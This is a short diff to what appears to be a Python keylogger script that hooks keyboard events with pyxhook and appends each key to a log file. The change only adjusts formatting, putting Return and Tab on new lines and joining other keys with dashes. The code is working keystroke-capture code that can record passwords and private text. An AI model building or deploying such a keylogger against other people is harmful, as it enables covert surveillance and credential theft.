@@ -8,7 +8,10 @@ log = os.environ.get(
 
 def OnKeyPress(event):
     with open(log, 'a') as f:
-        f.write('{}\n'.format(event.Key))
+        if(event.Key == "Return" or event.Key == "Tab"):
+            f.write('{}\n'.format(event.Key))
+        else:
+            f.write('{} - '.format(event.Key))
 
 
 new_hook = pyxhook.HookManager()
